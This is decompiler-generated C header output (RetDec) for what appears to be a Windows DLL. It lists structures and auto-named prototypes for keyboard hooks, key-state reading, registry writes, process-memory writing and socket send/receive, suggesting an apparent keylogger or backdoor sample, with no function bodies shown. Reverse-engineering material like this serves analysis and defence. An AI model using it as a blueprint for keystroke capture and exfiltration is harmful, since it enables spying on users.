//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <windows.h>

// ----------------- Float Types Definitions ------------------

typedef long double float80_t;

// ------------------------ Structures ------------------------

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _EXCEPTION_POINTERS {
    struct _EXCEPTION_RECORD * e0;
    struct _CONTEXT * e1;
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tagPOINT {
    int32_t e0;
    int32_t e1;
};

struct tagMSG {
    int32_t * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    struct tagPOINT e5;
};

// ------------------- Function Prototypes --------------------

int32_t DllCanUnloadNow(void);
int32_t DllGetClassObject(int32_t a1);
int32_t DllRegisterServer(void);
int32_t DllUnregisterServer(void);
int32_t entry_point(void);
int32_t * function_401060(int32_t nStdHandle);
void function_401068(int32_t dwExceptionCode, int32_t dwExceptionFlags, int32_t nNumberOfArguments, int32_t * lpArguments);
void function_401070(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue);
int32_t function_401078(struct _EXCEPTION_POINTERS * ExceptionInfo);
bool function_401080(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped);
void function_401088(int32_t uExitCode);
int32_t function_401090(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType);
bool function_401098(int32_t * hLibModule);
char * function_4010a0(void);
int32_t function_4010a8(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData);
void function_4010b0(struct _STARTUPINFOA * lpStartupInfo);
int32_t function_4010b8(void);
int32_t function_4010c0(int32_t * hKey);
int32_t function_4010c8(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult);
int32_t function_4010d0(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData);
int32_t function_4010d8(int16_t ** pbstr, int16_t * psz, int32_t len);
void function_4010e0(int16_t * bstrString);
int32_t function_4010e8(void);
int32_t function_4010f0(void);
bool function_4010f8(struct _LARGE_INTEGER * lpPerformanceCount);
int32_t function_401100(void);
int32_t function_401108(void);
int32_t * function_40112c(int32_t uFlags, int32_t uBytes);
int32_t * function_401134(int32_t * hMem);
int32_t * function_40113c(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect);
bool function_401144(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType);
void function_40114c(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_401154(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_40115c(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_401164(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
int32_t function_40116c(int32_t a1, int32_t a2);
int32_t function_4011bc(void);
int32_t function_4011c4(void);
int32_t function_4011f4(void);
int32_t function_40120c(void);
int32_t function_40127c(void);
int32_t function_401310(void);
int32_t function_401374(void);
int32_t function_4013ec(void);
int32_t function_4014a4(void);
int32_t function_401538(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4015b8(int32_t a1);
int32_t function_401648(int32_t a1, int32_t a2);
int32_t function_40176c(void);
int32_t function_4017f8(int32_t a1);
int32_t function_4018ae(void);
int32_t function_4018b3(void);
int32_t function_4018b5(int32_t a1);
int32_t function_4018bc(void);
int32_t function_40199c(void);
int32_t function_401a00(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401a30(void);
int32_t function_401a60(void);
int32_t function_401a84(void);
int32_t function_401aac(void);
int32_t function_401b1c(void);
int32_t function_401b54(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401c04(void);
int32_t function_401c8c(void);
int32_t function_401cd8(void);
int32_t function_401d64(void);
int32_t function_401d90(void);
int32_t function_401dc4(void);
int32_t function_401df0(void);
int32_t function_401ee4(void);
int32_t function_402060(void);
int32_t function_402065(void);
int32_t function_402067(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_402074(void);
int32_t function_402206(void);
int32_t function_40220b(void);
int32_t function_40220d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_402218(void);
int32_t function_4023f4(int32_t a1);
int32_t function_4024a5(void);
int32_t function_4024aa(void);
int32_t function_4024ac(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4024b8(void);
int32_t function_4024d8(void);
int32_t function_4024f8(void);
int32_t function_402548(void);
int32_t function_402553(void);
int32_t function_402554(void);
int32_t function_40259b(int32_t a1, int32_t a2);
int32_t function_4025a0(int32_t a1);
int32_t function_4025ab(void);
int32_t function_4025ac(int32_t a1, int32_t a2);
int32_t function_4025bc(void);
int32_t function_4025fc(void);
int32_t function_402624(void);
int32_t function_402634(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40263c(void);
int32_t function_402694(void);
int32_t function_4026b0(void);
int32_t function_402720(void);
int32_t function_402740(void);
int32_t function_4027a0(int32_t a1, int32_t a2);
int32_t function_4027ac(void);
int32_t function_402880(void);
int32_t function_40288c(void);
int32_t function_4028b0(int32_t nTypeFlag);
int32_t function_4028b8(void);
int32_t function_4028e8(void);
int32_t function_40297f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18);
int32_t function_402a64(int32_t a1);
int32_t function_402a84(int32_t a1, int32_t a2);
int32_t function_402ab4(void);
int32_t function_402abc(void);
int32_t function_402ac0(void);
int32_t function_402ac4(void);
int32_t function_402ac8(void);
int32_t function_402aee(void);
int32_t function_402af0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_402b19(void);
int32_t function_402b1e(int32_t a1);
int32_t function_402b40(void);
int32_t function_402b48(void);
int32_t function_402b58(void);
int32_t function_402b68(void);
int32_t function_402b84(void);
int32_t function_402ba8(int32_t a1, int32_t a2);
int32_t function_402bc0(int32_t a1);
int32_t function_402bd4(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402bf4(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_402c1c(void);
int32_t function_402c38(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402c58(int32_t a1, int32_t ExceptionInfo2, int32_t a3);
int32_t function_402d84(int32_t a1, int32_t a2);
int32_t function_402dbc(int32_t a1);
int32_t function_402e10(int32_t a1);
int32_t function_402e3f(void);
int32_t function_402e40(int32_t a1, int32_t result);
int32_t function_402e55(void);
int32_t function_402e58(int32_t a1);
int32_t function_402ef4(int32_t a1);
int32_t function_402ef8(int32_t a1, int32_t a2);
int32_t function_402f98(void);
int32_t function_402fb8(void);
int32_t function_402fe0(void);
int32_t function_403040(int32_t a1);
int32_t function_4030a0(int32_t a1);
int32_t function_403167(void);
int32_t function_403168(void);
int32_t function_4031c4(void);
int32_t function_4031f1(void);
int32_t function_4031f4(void);
int32_t function_403280(void);
int32_t function_403353(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_403358(void);
int32_t function_403362(void);
int32_t function_403364(int32_t a1);
int32_t function_40336f(void);
int32_t function_403370(void);
int32_t function_403394(void);
int32_t function_4033c4(void);
int32_t function_403408(void);
int32_t function_403434(void);
int32_t function_403464(void);
int32_t function_403474(void);
int32_t function_4034a0(void);
int32_t function_4034a4(void);
int32_t function_4034ae(void);
int32_t function_4034b0(void);
int32_t function_4034c7(void);
int32_t function_4034c8(void);
int32_t function_4034d0(void);
int32_t function_403514(void);
int32_t function_403587(void);
int32_t function_403588(int32_t result);
int32_t function_403611(void);
int32_t function_403614(void);
int32_t function_4036b8(void);
int32_t function_4036c8(void);
int32_t function_4036d4(void);
int32_t function_403718(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40371d(void);
int32_t function_403720(void);
int32_t function_403725(void);
int32_t function_403728(int32_t * a1);
int32_t function_403767(void);
int32_t function_403768(void);
int32_t function_4037b0(void);
int32_t function_40380c(void);
int32_t function_403854(void);
int32_t function_4038b8(void);
int32_t function_4038bf(void);
int32_t function_4038c0(void);
int32_t function_4038d8(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4038fc(void);
int32_t function_403920(void);
int32_t function_403954(void);
int32_t function_40396b(void);
int32_t function_40396c(void);
int32_t function_403a58(void);
int32_t function_403a6f(void);
int32_t function_403a70(void);
int32_t function_403b8c(int32_t a1);
int32_t function_403c7e(void);
int32_t function_403c80(void);
int32_t function_403c87(void);
int32_t function_403c88(void);
int32_t function_403c90(void);
int32_t function_403c98(int32_t a1);
int32_t function_403ca8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_403cad(void);
int32_t function_403cb0(int32_t a1, int32_t a2);
int32_t function_403cb8(int32_t a1);
int32_t function_403e44(void);
int32_t function_403e50(void);
int32_t function_403e8c(void);
int32_t function_403eb4(void);
int32_t function_403f10(void);
int32_t function_403f20(void);
int32_t function_403f84(void);
int32_t function_403f89(void);
int32_t function_403f8b(int32_t a1, int32_t a2);
int32_t function_403f90(void);
int32_t function_403fa8(void);
int32_t function_403fd4(void);
int32_t function_40403a(void);
int32_t function_40403f(void);
int32_t function_404041(int32_t a1);
int32_t function_404048(void);
int32_t function_404092(void);
int32_t function_404097(void);
int32_t function_404099(int32_t a1);
int32_t function_40409c(void);
int32_t function_404170(int32_t a1, int32_t a2);
int32_t function_404178(int32_t a1);
int32_t function_404180(void);
bool function_404188(int32_t dwTlsIndex);
int32_t * function_404190(int32_t dwTlsIndex);
bool function_404198(int32_t dwTlsIndex, int32_t * lpTlsValue);
int32_t function_4041a0(void);
int32_t function_4041ac(int32_t a1);
int32_t function_4041b4(void);
int32_t function_4041f8(void);
int32_t function_404224(void);
int32_t function_40424c(void);
int32_t function_404270(void);
int32_t function_4042b0(int32_t a1, int32_t a2);
int32_t function_4042bc(int32_t a1);
int32_t function_404304(void);
int32_t function_404329(void);
int32_t function_40432e(void);
int32_t function_404330(int32_t a1);
int32_t function_404334(void);
int32_t function_40433c(void);
int32_t function_404361(void);
int32_t function_404366(void);
int32_t function_404368(int32_t a1);
int32_t function_40436c(void);
int32_t function_404374(void);
int32_t function_40437c(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition);
int32_t function_404384(int32_t * hKey, char * lpSubKey);
int32_t function_40438c(int32_t a1, int32_t * a2, int32_t a3, int32_t a4, char * a5, int32_t a6);
int32_t function_404394(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5, char * a6, int32_t a7);
int32_t function_40439c(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData);
bool function_4043a4(int32_t * hObject);
int32_t function_4043ac(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2);
bool function_4043b4(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists);
int32_t * function_4043bc(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile);
int32_t * function_4043c4(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId);
bool function_4043cc(char * lpFileName);
int32_t function_4043d4(int32_t a1);
int32_t * function_4043dc(int32_t * hModule, char * lpName, char * lpType);
void function_4043e4(int32_t * hLibModule, int32_t dwExitCode);
int32_t * function_4043ec(void);
int32_t function_4043f4(int32_t * hFile, int32_t * lpFileSizeHigh);
int32_t function_4043fc(int32_t * hModule, char * lpFilename, int32_t nSize);
int32_t * function_404404(char * lpModuleName);
int32_t (*function_40440c(int32_t * hModule, char * lpProcName))();
int32_t function_404414(int32_t nBufferLength, char * lpBuffer);
int32_t function_40441c(void);
int32_t * function_404424(int32_t uFlags, int32_t dwBytes);
int32_t * function_40442c(int32_t * hMem);
int32_t * function_404434(int32_t * hMem);
bool function_40443c(int32_t * hMem);
int32_t * function_404444(char * lpLibFileName);
bool function_40444c(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped);
bool function_404454(int32_t * hFile);
void function_40445c(int32_t dwMilliseconds);
bool function_404464(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect);
int32_t function_40446c(void);
bool function_404474(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten);
int32_t function_40447c(char * lpString1, char * lpString2);
char * function_404484(char * lpString1, char * lpString2);
bool function_40448c(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer);
int32_t * function_404494(int32_t i);
int32_t * function_40449c(int32_t * hdc, int32_t * h);
int32_t function_4044a4(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam);
bool function_4044ac(void);
int32_t function_4044b4(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_4044bc(struct tagMSG * lpMsg);
bool function_4044c4(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam);
int32_t * function_4044cc(char * lpClassName, char * lpWindowName);
int32_t * function_4044d4(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow);
bool function_4044dc(struct tagPOINT * lpPoint);
int32_t function_4044e4(int32_t * hWnd, int32_t nIndex);
int32_t function_4044ec(int32_t * hWnd, char * lpClassName, int32_t nMaxCount);
int32_t * function_4044f4(int32_t uFormat);
int32_t * function_4044fc(int32_t * hWnd);
bool function_404504(char * lpKeyState);
bool function_40450c(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax);
int32_t * function_404514(int32_t * hWnd);
int32_t * function_40451c(int32_t * hWnd);
int32_t * function_404524(int32_t * hWnd, int32_t uCmd);
int32_t function_40452c(int32_t * hWnd, int32_t nIndex);
int32_t function_404534(int32_t * hWnd, int32_t * lpdwProcessId);
bool function_40453c(int32_t * hWnd);
bool function_404544(int32_t * hWnd);
bool function_40454c(int32_t * hWnd, int32_t uIDEvent);
int32_t * function_404554(int32_t * hInstance, char * lpIconName);
bool function_40455c(int32_t * hWndNewOwner);
bool function_404564(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
void function_40456c(int32_t nExitCode);
int32_t function_404574(int32_t * hWnd, int32_t * hDC);
int32_t function_40457c(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_404584(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t));
int32_t function_40458c(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong);
int32_t * function_404594(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId);
int32_t function_40459c(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags);
bool function_4045a4(int32_t * hhk);
int32_t function_4045ac(void);
int32_t * function_4045b4(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam);
int32_t function_4045bc(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle);
int32_t function_404614(void);
int32_t function_404639(void);
int32_t function_40463e(void);
int32_t function_404640(int32_t a1);
int32_t function_404644(void);
int32_t function_40464f(void);
int32_t function_4046c1(void);
int32_t function_4046c6(void);
int32_t function_4046c8(int32_t a1);
int32_t function_4046cc(void);
int32_t function_4046d4(void);
int32_t function_404710(void);
int32_t function_404735(void);
int32_t function_40473a(void);
int32_t function_40473c(int32_t a1);
int32_t function_404740(void);
int32_t function_404748(void);
int32_t function_40476d(void);
int32_t function_404772(void);
int32_t function_404774(int32_t a1);
int32_t function_404778(void);
int32_t function_404780(int32_t s);
int32_t function_404788(int32_t s, struct sockaddr * name, int32_t namelen);
int16_t function_404790(int16_t hostshort);
char * function_404798(struct in_addr in);
int32_t function_4047a0(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_4047a8(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_4047b0(int32_t af, int32_t type, int32_t protocol);
struct hostent * function_4047b8(char * name);
int32_t function_4047c0(char * name, int32_t namelen);
int32_t function_4047c8(int16_t wVersionRequested, struct WSAData * lpWSAData);
int32_t function_4047d0(void);
int32_t function_4047d8(void);
int32_t function_4047fd(void);
int32_t function_404802(void);
int32_t function_404804(int32_t a1);
int32_t function_404808(void);
int32_t function_404920(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_404a93(void);
int32_t function_404a98(void);
int32_t function_404a9a(int32_t a1, int32_t a2);
int32_t function_404aa0(void);
int32_t function_404ab7(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404b8b(void);
int32_t function_404b90(void);
int32_t function_404b92(int32_t a1, int32_t a2);
int32_t * function_404b98(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd);
int32_t function_404ba0(void);
int32_t function_404bc5(void);
int32_t function_404bca(void);
int32_t function_404bcc(int32_t a1);
int32_t function_404bd0(void);
int32_t function_404bd8(void);
int32_t function_404bfd(void);
int32_t function_404c02(void);
int32_t function_404c04(int32_t a1);
int32_t function_404c08(void);
int32_t function_404c10(void);
int32_t function_404c35(void);
int32_t function_404c3a(void);
int32_t function_404c3c(int32_t a1);
int32_t function_404c40(void);
int32_t function_404c48(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5);
int32_t function_404c50(void);
int32_t function_404c75(void);
int32_t function_404c7a(void);
int32_t function_404c7c(int32_t a1);
int32_t function_404c80(void);
int32_t function_404c88(void);
int32_t function_404ca0(void);
int32_t function_404dc4(void);
int32_t function_404dc9(void);
int32_t function_404dcb(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404def(void);
int32_t function_404df8(void);
int32_t function_404e66(void);
int32_t function_404e6b(void);
int32_t function_404e6d(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_404e77(void);
int32_t function_404ea5(void);
int32_t function_404eaa(void);
int32_t function_404eac(int32_t a1);
int32_t function_404eb0(void);
int32_t function_404eb8(void);
int32_t function_404f3b(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_40500e(void);
int32_t function_405013(void);
int32_t function_405015(void);
int32_t function_405019(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_405108(void);
int32_t function_40511f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4051f3(void);
int32_t function_4051f8(void);
int32_t function_4051fa(int32_t a1, int32_t a2);
int32_t function_405200(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405314(void);
int32_t function_405319(void);
int32_t function_40531b(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405324(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4053e3(void);
int32_t function_4053e8(void);
int32_t function_4053ea(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4053f0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40546a(void);
int32_t function_40546f(void);
int32_t function_405471(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405475(void);
int32_t function_4054f0(int32_t hhk, int32_t nCode, int32_t wParam);
int32_t function_405538(void);
int32_t function_405570(void);
int32_t function_405588(void);
int32_t function_40559f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405673(void);
int32_t function_405678(void);
int32_t function_40567a(int32_t a1, int32_t a2);
int32_t function_405683(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_40573c(void);
int32_t function_4058f8(void);
int32_t function_4058fd(void);
int32_t function_4058ff(int32_t a1, int32_t a2);
int32_t function_405908(void);
int32_t function_405964(void);
int32_t function_405a08(void);
int32_t function_405a0d(void);
int32_t function_405a0f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405a18(void);
int32_t function_405a24(void);
int32_t function_405a95(void);
int32_t function_405a9a(void);
int32_t function_405a9c(int32_t a1);
int32_t function_405aa4(void);
int32_t function_405ad0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_405d45(void);
int32_t function_405d4a(void);
int32_t function_405d4c(int32_t a1);
int32_t function_405e17(void);
int32_t function_405e24(void);
int32_t function_405e3b(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405f23(void);
int32_t function_405f28(void);
int32_t function_405f2a(int32_t a1, int32_t a2);
int32_t function_405f30(void);
int32_t function_40605f(void);
int32_t function_406083(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406157(void);
int32_t function_40615c(void);
int32_t function_40615e(int32_t a1, int32_t a2);
int32_t function_406164(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_406200(void);
int32_t function_406237(void);
int32_t function_40623c(void);
int32_t function_40623e(int32_t a1);
int32_t function_406240(void);
int32_t function_406282(void);
int32_t function_406287(void);
int32_t function_406289(int32_t a1);
int32_t function_40628c(int32_t a1);
int32_t function_4063cf(void);
int32_t function_4063d4(void);
int32_t function_4063d6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4063e7(void);
int32_t function_4063f6(void);
int32_t function_406400(int32_t a1);
int32_t function_406410(void);
int32_t function_406427(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4064fb(void);
int32_t function_406500(void);
int32_t function_406502(int32_t a1, int32_t a2);
int32_t function_406508(void);
int32_t function_40654c(void);
int32_t function_40657c(void);
int32_t function_40659c(void);
int32_t function_4065a8(void);
int32_t function_4065d0(void);
int32_t function_4065f0(void);
int32_t function_406607(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4066db(void);
int32_t function_4066e0(void);
int32_t function_4066e2(int32_t a1, int32_t a2);
int32_t function_4066e8(void);
int32_t function_4066f0(void);
int32_t function_40677c(void);
int32_t function_406781(void);
int32_t function_406783(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40678c(void);
int32_t function_4067c4(void);
int32_t function_40690b(void);
int32_t function_406910(void);
int32_t function_406912(int32_t a1);
int32_t function_406937(int32_t a1, int32_t a2);
int32_t function_406bec(void);
int32_t function_406bf1(void);
int32_t function_406bf3(int32_t a1);
int32_t function_406c1f(void);
int32_t function_406c27(void);
int32_t function_406c2e(void);
int32_t function_406c6a(void);
int32_t function_406c6c(void);
int32_t function_406d1c(void);
int32_t function_406d51(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7);
int32_t function_406e71(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, uint32_t result, uint32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14);
int32_t function_406f97(void);
int32_t function_406f9c(void);
int32_t function_406f9e(int32_t a1, int32_t a2);
int32_t function_406fdf(void);
int32_t function_406fec(void);
int32_t function_4071a6(void);
int32_t function_4071ab(void);
int32_t function_4071ad(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4071e4(void);
int32_t function_4072e8(void);
int32_t function_4072ed(void);
int32_t function_4072ef(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407324(void);
int32_t function_407413(void);
int32_t function_407418(void);
int32_t function_40741a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407424(void);
int32_t function_40746a(void);
int32_t function_40746f(void);
int32_t function_407471(int32_t a1);
int32_t function_407474(void);
int32_t function_4074b6(void);
int32_t function_4074bb(void);
int32_t function_4074bd(int32_t a1);
bool function_4074c0(char * pszPath);
int32_t function_4074c8(void);
int32_t function_407508(int32_t a1, int32_t nIndex);
int32_t function_4075da(void);
int32_t function_4075df(void);
int32_t function_4075e1(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4075ec(int32_t a1, uint32_t a2, int32_t a3);
int32_t function_407674(void);
int32_t function_40768c(int32_t a1);
int32_t function_4076a4(void);
int32_t function_4076b8(void);
int32_t function_4076e0(void);
int32_t function_407714(void);
int32_t function_40774c(void);
int32_t function_40778c(void);
int32_t function_4077c4(void);
int32_t function_4077f4(void);
int32_t function_40786e(void);
int32_t function_407873(void);
int32_t function_407875(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407880(void);
int32_t function_4078e1(void);
int32_t function_4078e6(void);
int32_t function_4078e8(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407903(void);
float80_t function_40790b(void);
int32_t function_407910(void);
int32_t function_40798f(void);
int32_t function_407994(void);
int32_t function_407996(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4079ac(void);
int32_t function_407a08(void);
int32_t function_407b15(void);
int32_t function_407b1a(void);
int32_t function_407b1c(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407b3c(void);
int32_t function_407b54(void);
int32_t function_407bc0(void);
int32_t function_407bd7(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407cab(void);
int32_t function_407cb0(void);
int32_t function_407cb2(int32_t a1, int32_t a2);
int32_t function_407cb8(int32_t nCode, int32_t wParam, int32_t lParam);
int32_t function_407d10(void);
int32_t function_407d27(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407dfb(void);
int32_t function_407e00(void);
int32_t function_407e02(int32_t a1, int32_t a2);
int32_t * function_407e08(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size);
int32_t function_407e10(void);
int32_t function_407e35(void);
int32_t function_407e3a(void);
int32_t function_407e3c(int32_t a1);
int32_t function_407e40(void);
int32_t function_407ea0(char * a1, char * a2, int32_t a3);
int32_t function_407f2c(void);
int32_t function_407f74(int32_t a1);
int32_t function_40802c(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_408030(void);
int32_t function_408047(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40811b(void);
int32_t function_408120(void);
int32_t function_408122(int32_t a1, int32_t a2);
